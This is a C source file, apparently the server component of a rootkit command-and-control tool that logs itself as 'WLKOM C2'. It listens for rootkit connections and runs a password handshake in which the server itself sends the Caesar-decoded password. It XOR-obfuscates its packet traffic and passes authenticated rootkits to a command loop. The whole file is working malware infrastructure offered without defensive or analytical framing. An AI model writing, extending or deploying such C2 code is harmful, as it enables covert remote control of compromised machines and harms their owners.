#include "server.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "commands.h"

#define PASS_SHIFT 3
#define ALPHA_SIZE 26
#define DIGIT_SIZE 10
#define BUFFER_SIZE 256
#define MAX_CLIENTS 5
#define TIMESTAMP_SIZE 32

static char *decrypt_caesar(const char *encrypted)
{
    static char decrypted[BUFFER_SIZE];
    int i;

    for (i = 0; encrypted[i]; i++)
    {
        char c = encrypted[i];
        if (c >= 'a' && c <= 'z')
            decrypted[i] =
                'a' + (c - 'a' - PASS_SHIFT + ALPHA_SIZE) % ALPHA_SIZE;
        else if (c >= 'A' && c <= 'Z')
            decrypted[i] =
                'A' + (c - 'A' - PASS_SHIFT + ALPHA_SIZE) % ALPHA_SIZE;
        else if (c >= '0' && c <= '9')
            decrypted[i] =
                '0' + (c - '0' - PASS_SHIFT + DIGIT_SIZE) % DIGIT_SIZE;
        else
            decrypted[i] = c;
    }
    decrypted[i] = '\0';
    return decrypted;
}

int check_password(void)
{
    char input[BUFFER_SIZE];

    printf("Password: ");
    fflush(stdout);
    if (!fgets(input, sizeof(input), stdin))
        return 0;
    input[strcspn(input, "\n")] = '\0';
    return strcmp(input, decrypt_caesar(WLKOM_PASSWORD)) == 0;
}

static void xor_crypt(char *data, size_t len)
{
    for (size_t i = 0; i < len; i++)
        data[i] ^= CRYPTO_KEY[i % CRYPTO_KEYLEN];
}

#pragma pack(push, 1)
typedef struct
{
    uint8_t opcode;
    uint32_t length;
} packet_hdr_t;
#pragma pack(pop)

static int send_all(int fd, const void *buf, size_t len)
{
    size_t sent = 0;
    const char *ptr = buf;

    while (sent < len)
    {
        ssize_t n = send(fd, ptr + sent, len - sent, MSG_NOSIGNAL);
        if (n <= 0)
            return -1;
        sent += n;
    }
    return 0;
}

static int recv_all(int fd, void *buf, size_t len)
{
    size_t got = 0;
    char *ptr = buf;

    while (got < len)
    {
        ssize_t n = recv(fd, ptr + got, len - got, MSG_WAITALL);
        if (n <= 0)
            return -1;
        got += n;
    }
    return 0;
}

int send_packet(int fd, uint8_t opcode, const char *payload, uint32_t len)
{
    packet_hdr_t hdr;
    char *enc;
    int ret;

    hdr.opcode = opcode;
    hdr.length = htonl(len);

    if (send_all(fd, &hdr, sizeof(hdr)) < 0)
        return -1;

    if (len == 0 || !payload)
        return 0;

    enc = malloc(len);
    if (!enc)
        return -1;
    memcpy(enc, payload, len);
    xor_crypt(enc, len);

    ret = send_all(fd, enc, len);
    free(enc);
    return ret;
}

int recv_packet(int fd, uint8_t *opcode, char **payload, uint32_t *len)
{
    packet_hdr_t hdr;

    if (recv_all(fd, &hdr, sizeof(hdr)) < 0)
        return -1;

    *opcode = hdr.opcode;
    *len = ntohl(hdr.length);

    if (*len == 0)
    {
        *payload = NULL;
        return 0;
    }

    *payload = malloc(*len + 1);
    if (!*payload)
        return -1;

    if (recv_all(fd, *payload, *len) < 0)
    {
        free(*payload);
        *payload = NULL;
        return -1;
    }
    (*payload)[*len] = '\0';
    xor_crypt(*payload, *len);
    return 0;
}

static void log_event(const char *fmt, ...)
{
    time_t t;
    struct tm *tm_ptr;
    char ts[TIMESTAMP_SIZE];
    va_list ap;

    t = time(NULL);
    tm_ptr = localtime(&t);
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", tm_ptr);

    printf("[%s] ", ts);

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static void handle_client(client_t *c)
{
    const char *real_pass;
    uint8_t opcode;
    char *payload = NULL;
    uint32_t payload_len = 0;

    log_event("New connection from %s:%d\n", c->remote_ip, c->remote_port);

    c->connected = 1;
    c->authed = 0;

    real_pass = decrypt_caesar(WLKOM_PASSWORD);
    if (send_packet(c->fd, CMD_AUTH, real_pass, strlen(real_pass)) < 0)
    {
        log_event("Failed to send auth\n");
        goto disconnect;
    }

    if (recv_packet(c->fd, &opcode, &payload, &payload_len) < 0)
    {
        log_event("No auth response\n");
        goto disconnect;
    }

    if (opcode != CMD_AUTH || !payload || strncmp(payload, "OK", 2) != 0)
    {
        log_event("Auth failed: %s\n", payload ? payload : "null");
        free(payload);
        goto disconnect;
    }
    free(payload);
    payload = NULL;

    c->authed = 1;
    log_event("Rootkit authenticated from %s:%d\n", c->remote_ip,
              c->remote_port);

    commands_loop(c);

disconnect:
    c->connected = 0;
    c->authed = 0;
    close(c->fd);
    log_event("Disconnected from %s:%d\n", c->remote_ip, c->remote_port);
    free(c);
}

int server_init(int port)
{
    int srv_fd;
    int opt;
    struct sockaddr_in addr;

    srv_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (srv_fd < 0)
    {
        perror("socket");
        return -1;
    }

    opt = 1;
    setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(srv_fd, (void *)&addr, sizeof(addr)) < 0)
    {
        perror("bind");
        close(srv_fd);
        return -1;
    }

    if (listen(srv_fd, MAX_CLIENTS) < 0)
    {
        perror("listen");
        close(srv_fd);
        return -1;
    }

    log_event("WLKOM C2 listening on port %d\n", port);
    return srv_fd;
}

void server_run(int srv_fd)
{
    struct sockaddr_in client_addr;
    socklen_t addr_len;
    int client_fd;
    client_t *c;

    while (1)
    {
        addr_len = sizeof(client_addr);

        client_fd = accept(srv_fd, (void *)&client_addr, &addr_len);
        if (client_fd < 0)
        {
            perror("accept");
            continue;
        }

        c = malloc(sizeof(*c));
        if (!c)
        {
            close(client_fd);
            continue;
        }
        c->fd = client_fd;
        c->connected = 0;
        c->authed = 0;
        c->remote_port = ntohs(client_addr.sin_port);
        inet_ntop(AF_INET, &client_addr.sin_addr, c->remote_ip,
                  sizeof(c->remote_ip));

        handle_client(c);
    }
}

void server_close(int srv_fd)
{
    close(srv_fd);
}
